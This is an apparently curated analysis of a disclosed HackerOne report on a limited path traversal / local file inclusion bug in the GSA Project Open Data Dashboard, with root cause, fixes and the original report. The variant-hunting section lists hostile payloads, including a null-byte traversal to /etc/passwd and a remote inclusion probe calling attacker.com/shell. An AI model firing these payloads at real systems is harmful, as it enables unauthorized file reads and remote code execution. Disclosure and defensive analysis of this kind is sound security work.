# Limited Local File Inclusion (LFI) via Path Traversal in Docs Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 895972 | https://hackerone.com/reports/895972
- **Submitted:** 2020-06-11
- **Reporter:** mariuszdeepsec
- **Program:** GSA Project Open Data Dashboard
- **Bounty:** Not specified
- **Severity:** low
- **Vuln:** Local File Inclusion (LFI), Path Traversal, Improper Input Validation
- **CVEs:** None
- **Category:** uncategorised

## Summary
A Local File Inclusion vulnerability exists in the Docs class index() function where user-controlled input is concatenated into file_get_contents() without proper sanitization. While an attacker can traverse directories using '../' sequences, the hardcoded '.md' extension limits readable files to Markdown documents, reducing immediate risk.

## Attack scenario
1. Attacker identifies that the $page parameter in /dashboard/Docs/index/{page} is directly concatenated into a file path
2. Attacker URL-encodes path traversal sequences (..%2f) to bypass basic filters and access parent directories
3. Attacker crafts URL like /dashboard/Docs/index/..%2fREADME to read README.md from parent directory instead of expected docs subdirectory
4. Server constructs path as /var/www/dashboard/new/ + ../README + .md = /var/www/dashboard/new/../README.md
5. file_get_contents() resolves the path and reads the unintended file, returning its contents in the application GUI
6. Attacker continues fuzzing directory traversal to enumerate accessible .md files from restricted directories

## Root cause
Insufficient input validation and sanitization of the $page parameter before use in file operations. The application concatenates user input directly into a file path without using functions like basename(), realpath validation, or whitelist filtering. While the '.md' extension provides some protection, it does not prevent directory traversal attacks.

## Attacker mindset
An attacker would recognize this as a path traversal vulnerability with limited immediate impact due to extension restrictions. However, they would flag it as a potential escalation vector, particularly noting that future PHP versions, null-byte injection bypasses (in older PHP), or encoding tricks could circumvent the extension restriction. The attacker views this as exploitable with time/opportunity and advocates for defense-in-depth fixes.

## Defensive takeaways
- Implement strict input validation using basename() to reject path traversal sequences like '../' and '%2f'
- Use whitelist-based approach: only allow known safe page names rather than arbitrary user input
- Implement realpath() validation to ensure resolved path stays within intended directory using string comparison
- Apply principle of least privilege: ensure PHP process runs with minimal file system permissions
- Use DIRECTORY_SEPARATOR and pathinfo() functions for cross-platform path handling
- Never directly concatenate user input into file operations; use configuration-driven file mappings instead
- Implement logging and alerting for file_get_contents() calls with unusual paths
- Consider using a templating engine or dedicated documentation library instead of direct file reads

## Variant hunting
Test null byte injection (%00) to truncate extensions in vulnerable PHP versions: /Docs/index/../../etc/passwd%00
Attempt double URL encoding (%252f) to bypass single-pass filters
Test case sensitivity variations and alternate separators on different OS platforms
Look for similar patterns in other file read functions (include, require, readfile, file) in codebase
Check if remote URL inclusion is enabled (stream wrappers) to enable RFI: /Docs/index/http://attacker.com/shell%00
Test with various encoding schemes (UTF-8 overlong, Unicode) to bypass validation
Check for race conditions if file permissions or paths can be manipulated between validation and access
Investigate if other parameters or functions in Docs class have similar vulnerabilities

## MITRE ATT&CK
- T1190
- T1083
- T1005
- T1135

## Notes
The researcher correctly identified this as 'low' risk due to extension restrictions but appropriately flagged escalation potential. This is good security practice - reporting latent vulnerabilities even when current exploitation is limited. The vulnerability demonstrates how defense-in-depth fails when a single mechanism (extension appending) is the only control. The reference to future PHP bugs is prescient - similar issues have been chained with other vulnerabilities in real-world exploits. The application should move to a Content Security approach rather than relying on extension-based filtering.

## Full report
<details><summary>Expand</summary>

## Summary:
Due to improper parameter sensitization  local file inclusion is possible. LFI is limited as we were not able to truncate the end of string.

## Description:
Application root is located at 
/var/www/dashboard/new/public

Due to URL Manipulation we are able to raed file from 
/var/www/dashboard/new/
Which should not be allowed.

Below we present function Index in Docs class -> parameter $page is set in URL  in below example "..%2fREADME" 
Path is constructed as follow $docs_path = $docs_path . $page . '.md'; then file is read in file_get_contents and returned in application GUI.
LFI is limited due to  " . '.md';" part, but may be bypassed in futures, we have not found a way to bypass it thats why the risk was set to low. In case of bugs combination , PHP bugs etc.. in future this may be escalated. User should  not control any part of "file_get_contents" function
```
 public function index($page = 'main')
    {

        $data = array();

        $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
        $docs_path = $docs_path . $page . '.md';
        $docs = @file_get_contents($docs_path);
```

## Steps To Reproduce:
1. Read file from main root by calling URL:
https://labs.data.gov/dashboard/Docs/index/..%2fREADME

## POC

File README.md not exists in our current dir.
F863983

File README.md can be read due to LFI
https://labs.data.gov/dashboard/Docs/index/..%2fREADME
F863984

Confirmation:
File exact as:
https://github.com/GSA/project-open-data-dashboard/blob/master/README.md

## Impact

User have ability to control part of @file_get_contents function. This type of usage may lead to critical file read. In this scenario, we did not bypass the hardcoded ext so files was limited to ".md" and low risk was set.  This should be corrected in case of future PHP bugs, if attacker will truncate the .ext part any file read will be allowed.

</details>

---
*Analysed by Claude on 2026-05-24*
